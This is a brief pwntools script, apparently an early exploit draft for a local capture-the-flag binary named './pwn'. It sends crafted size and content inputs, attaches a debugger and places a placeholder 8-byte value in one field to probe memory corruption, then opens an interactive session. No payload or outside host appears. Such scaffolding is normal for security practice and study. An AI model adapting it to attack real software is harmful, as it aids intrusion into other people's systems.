from pwn import *
context.log_level='debug'
def f(size,c,escape="A"):
	p.sendlineafter("Message:\n",str(size).encode('utf8'))
	p.sendafter("Content:\n",c)
	p.sendafter("?\n",escape)
p=process("./pwn")
f(10,b"1")
f(100,b"1")
gdb.attach(p)
f(10,b"q",p64(0xdeadbeefcafebabe)+b'\n')
p.interactive()
